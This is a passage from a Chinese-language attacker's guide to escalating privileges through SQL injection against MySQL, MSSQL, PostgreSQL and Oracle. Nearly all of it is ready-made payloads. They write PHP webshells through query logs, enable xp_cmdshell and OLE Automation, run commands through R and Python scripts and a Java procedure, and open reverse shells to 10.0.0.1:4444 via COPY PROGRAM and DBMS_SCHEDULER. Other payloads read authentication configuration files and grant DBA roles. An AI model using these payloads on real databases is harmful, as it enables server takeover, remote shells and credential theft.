- **CVE-2012-5611** (MySQL 基于栈的缓冲区溢出，特定版本)：可利用执行代码

```sql
-- MySQL general_log 技巧 (无需 FILE 权限，但需日志路径可写)
'; SET GLOBAL general_log='ON'#
'; SET GLOBAL general_log_file='/var/www/html/logshell.php'#
'; SELECT '<?php system($_GET["cmd"]);?>'#
'; SET GLOBAL general_log='OFF'#

-- MySQL slow_query_log 同原理替代
'; SET GLOBAL slow_query_log='ON'#
'; SET GLOBAL slow_query_log_file='/var/www/html/shell.php'#
'; SELECT '<?php system($_GET["cmd"]);?>' FROM information_schema.tables WHERE sleep(11)#
```

#### 路径四：MOF 提权 (Windows + MySQL)

仅适用于 Windows，利用 Windows WMI 的 MOF 自动执行机制：向 `C:/Windows/System32/wbem/mof/` 写入 `.mof` 文件，系统会自动编译执行：

```sql
'; SELECT 0x... INTO DUMPFILE 'C:/Windows/System32/wbem/mof/nullevt.mof'#
-- MOF 内容：vbs 脚本创建用户或反弹 shell，Windows 每 5 秒扫描一次 mof 目录
```

### 4.3 MSSQL 提权路径

#### 路径一：启用 xp_cmdshell → 命令执行

MSSQL 的 `xp_cmdshell` 默认禁用。提权的核心目标是启用它：

```sql
-- 1. 检查当前是否 sysadmin
'; SELECT IS_SRVROLEMEMBER('sysadmin')--

-- 2. 启用 xp_cmdshell (需 sysadmin)
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--

-- 3. 执行命令
'; EXEC xp_cmdshell 'whoami'--
```

#### 路径二：db_owner → sysadmin 提权

如果当前是 `db_owner` 但非 `sysadmin`，可利用 `TRUSTWORTHY` 属性提权：

```sql
-- 1. 检查当前数据库的 TRUSTWORTHY 属性
'; SELECT name,is_trustworthy_on FROM sys.databases WHERE name=DB_NAME()--
-- is_trustworthy_on = 1 表示可以利用

-- 2. 利用 TRUSTWORTHY 创建高权限存储过程
'; CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'--
'; EXEC sp_elevate--
```

**EXECUTE AS OWNER 原理**：当数据库的 `TRUSTWORTHY` 为 ON 且 `db_owner` 映射到一个 `sysadmin` 登录时，在该数据库中创建的 `EXECUTE AS OWNER` 存储过程将以 `sysadmin` 权限执行。

#### 路径三：impersonate (模拟) 其他用户

```sql
-- 1. 查看可模拟的用户
'; SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'--

-- 2. 模拟 sysadmin 用户
'; EXECUTE AS LOGIN='sa'--
'; SELECT SYSTEM_USER--  -- 确认当前身份
```

#### 路径四：OLE Automation 替代 xp_cmdshell

如果 `xp_cmdshell` 被彻底移除而非仅禁用，OLE Automation 是备选方案：

```sql
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE--

'; DECLARE @o INT;EXEC sp_oacreate 'wscript.shell',@o OUT;EXEC sp_oamethod @o,'run',NULL,'cmd /c whoami > C:\tmp\out.txt'--
```

#### 路径五：R 和 Python 脚本执行 (SQL Server 2016+)

```sql
-- R 执行 (需外部脚本启用)
'; EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("whoami",intern=TRUE))' WITH RESULT SETS (([output] NVARCHAR(4000)))--

-- Python 执行
'; EXEC sp_execute_external_script @language=N'Python',@script=N'import subprocess;print(subprocess.check_output(["whoami"]))' WITH RESULT SETS (([output] NVARCHAR(4000)))--
```

### 4.4 PostgreSQL 提权路径

#### 路径一：获取超级用户 → COPY PROGRAM → 命令执行

```sql
-- 1. 检查超级用户
' UNION SELECT current_setting('is_superuser'),rolsuper FROM pg_roles WHERE rolname=current_user--

-- 2. 如果已是超级用户，读到配置文件中的其他凭据
' UNION SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf',0,10000),NULL--

-- 3. 命令执行 (超级用户)
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'--
```

#### 路径二：修改 pg_hba.conf → 放宽认证

如果当前用户有 `pg_read_file` 和 `pg_write_file` 权限：

```sql
-- 1. 读取当前 HBA 配置
' UNION SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf',0,10000),NULL--

-- 2. 写入新配置允许 trust 认证 (或通过网络反弹)
-- (写入后需要 reload 配置: SELECT pg_reload_conf())
```

#### 路径三：通过 SECURITY DEFINER 函数借用权限

PostgreSQL 中，以 `SECURITY DEFINER` 创建的函数以**函数所有者**身份执行，而非调用者身份。如果存在高权限用户创建了 `SECURITY DEFINER` 函数，低权限用户调用时可以短暂借用权限：

```sql
-- 查找所有 SECURITY DEFINER 函数
' UNION SELECT proname,proowner::regrole FROM pg_proc WHERE prosecdef=true--
```

#### 路径四：利用 dblink 扩展横向移动

```sql
-- 如果 dblink 可用，连接到本地更高权限的数据库或远程数据库
'; CREATE EXTENSION dblink--
'; SELECT dblink_connect('host=localhost user=postgres password=postgres dbname=postgres')--
'; SELECT * FROM dblink('SELECT $$whoami$$') AS t(result TEXT)--
```

### 4.5 Oracle 提权路径

Oracle 的权限模型较复杂，通过角色和系统权限分层。提权通常围绕获取 Java 权限或 DBA 角色：

```sql
-- 1. 查看当前用户的所有角色
' UNION SELECT granted_role,NULL FROM user_role_privs--

-- 2. 查看当前用户的系统权限
' UNION SELECT privilege,NULL FROM user_sys_privs--

-- 3. 尝试利用 CREATE PROCEDURE 权限 (如已持有)
'; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT';END;--

-- 4. 利用 DBMS_SCHEDULER 执行 OS 命令 (需 CREATE JOB 权限)
'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'CMD',job_type=>'EXECUTABLE',job_action=>'/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',number_of_arguments=>0,enabled=>TRUE);END;--

-- 5. 利用 Java 存储过程执行命令 (需 Java 权限)
'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS import java.io.*;public class OSCommand{public static String run(String cmd){try{Process p=Runtime.getRuntime().exec(cmd);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l,s="";while((l=r.readLine())!=null)s+=l;return s;}catch(Exception e){return e.toString();}}}';END;--
```

### 4.6 通用提权策略总结

| 策略 | 适用数据库 | 核心思路 |
|------|-----------|---------|
| **静态凭据窃取** | 所有 | 读取应用源码/配置文件，获取硬编码的高权限数据库凭据 |
| **修改系统表** | MySQL, MSSQL | 直接修改 `mysql.user` / `sys.configurations` 来提升自身权限 |
| **UDF 共享库注入** | MySQL | 利用 FILE 权限写入恶意 .so/.dll 到 plugin 目录 |
| **存储过程借用** | MSSQL, PostgreSQL | EXECUTE AS / SECURITY DEFINER 借用高权限身份 |
| **日志文件投毒** | MySQL | general_log/slow_query_log 写入 webshell |
| **数据库漏洞利用** | 所有 | 利用已公开的 CVE 实现提权 |
| **横向移动** | 所有 | 通过数据库链接或 dblink 跳转到更高权限的数据库实例 |
